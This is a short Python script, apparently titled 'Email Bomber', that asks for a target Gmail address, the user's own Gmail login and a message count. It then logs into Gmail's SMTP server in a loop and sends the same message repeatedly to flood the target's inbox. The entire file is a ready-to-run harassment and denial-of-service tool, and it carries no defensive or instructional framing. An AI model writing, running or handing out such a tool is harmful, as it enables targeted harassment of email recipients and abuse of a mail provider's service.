import smtplib
import time

print ("           ________    __        __        ____        ________    __                                             ")
print ("          |########|  |##\      /##|      /####\      |########|  |##|              By Sow                        ")
print ("          |##|____    |###\ __ /###|     /##/\##\        |##|     |##|                                            ")
print ("          |########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     ")
print ("          |##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    ")
print ("          |########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    ")
print ("                                                                                                                  ")

try:
    bomb_email = input("Enter the gmail address to attack:")
    email = input("Enter your gmail address:")
    password = input("Enter your password:")
    message = input("Write the Message to send:")
    counter = int(input("How many emails to send?:"))

    for x in range(0,counter):
        print("Number of mail to send:", x+1)
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("An error has occurred")